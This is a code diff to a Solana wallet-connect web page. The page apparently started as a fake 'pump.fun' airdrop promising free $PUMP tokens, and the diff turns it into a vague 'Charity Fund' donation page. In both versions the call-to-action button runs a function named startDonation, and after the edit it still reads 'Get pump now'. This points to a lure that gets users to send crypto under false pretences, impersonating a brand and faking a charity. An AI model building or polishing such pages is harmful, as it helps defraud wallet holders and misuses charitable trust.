@@ -107,7 +107,7 @@ const Index = () => {
               alt="Pill Logo"
               className="h-8 w-8 object-contain"
             />
-            <span className="text-2xl font-bold text-white">pump.fun</span>
+            <span className="text-2xl font-bold text-white">Charity Fund</span>
           </div>
           <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
         </div>
@@ -120,14 +120,14 @@ const Index = () => {
           <div className="text-center space-y-4">
             <div className="space-y-3">
               <h1 className="text-5xl font-bold text-white">
-                Get Your Share Of
+                Support Our Charity Mission
               </h1>
               <div className="text-4xl font-bold bg-gradient-to-r from-green-400 to-green-600 text-transparent bg-clip-text animate-gradient">
-                1,000,000 $PUMP
+                Donate SOL or SPL Tokens
               </div>
             </div>
             <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
-              Join exclusive airdrop and be part of the most exciting memecoin launch on solana. Early participants get bonus rewards and white listing access.
+              Connect your wallet to donate SOL or supported tokens. Your contribution directly supports our charity programs and helps people in need.
             </p>
             {/* Added CenterWalletButton component */}
             <div className="pt-4">
@@ -141,7 +141,7 @@ const Index = () => {
               <div className="text-center space-y-4">
                 <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                   <Wallet className="w-4 h-4" />
-                  Connect your wallet to get $ pump
+                  Connect your wallet to donate
                 </p>
               </div>
             ) : (
@@ -154,18 +154,16 @@ const Index = () => {
                 </div>
 
                 {/* Action Button */}
-                {!isProcessing && transactions.length === 0 && (
+                {!isProcessing && (
                   <Button
                     variant="pump"
                     size="xl"
                     onClick={startDonation}
                     className="w-full"
-                    disabled={isProcessing}
+                    disabled={!isEligible}
                   >
-                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                    </svg>
-                    Get $PUMP Now
+                    <Heart className="w-5 h-5 mr-2" />
+                    Get pump now
                   </Button>
                 )}
 
